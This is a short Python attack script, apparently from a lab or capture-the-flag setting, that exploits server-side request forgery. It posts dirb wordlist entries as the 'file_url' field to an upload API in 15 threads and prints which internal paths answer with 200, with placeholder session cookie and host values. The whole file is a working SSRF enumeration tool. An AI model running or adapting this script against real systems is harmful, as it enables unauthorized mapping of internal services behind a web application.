#!usr/bin/python3
import requests
import threading

#common.txt wordlist
wordlist_fd = open("/usr/share/dirb/wordlists/common.txt", "r")

#vulnerable website url
url = "http://localhost/api/v2/upload"

def fuzz_internal_endpoints():
    while True:
        #referencing the global variables
        global wordlist_fd
        global url
        word = wordlist_fd.readline().strip()
        # check for EOF
        if word == "":
            break
        headers = {"Content-Type": "application/json"}
        cookies = {"uuid_hash":"<<uuid_hash>>"}
        json = {"file_url": f"<<host>>/{word}"}

        #sending the request untill we get the response from the server
        while True:
            res = requests.post(url, headers=headers, cookies=cookies, json=json)
            if res.status_code == 404 and res.text == "resource not found":
                break
            elif res.status_code == 200:
                print("/{} -> {}".format(word, res.status_code))
                break


def main():
    for i in range(15):
        t = threading.Thread(target=fuzz_internal_endpoints)
        t.start()

if __name__ == "__main__":
    main()

#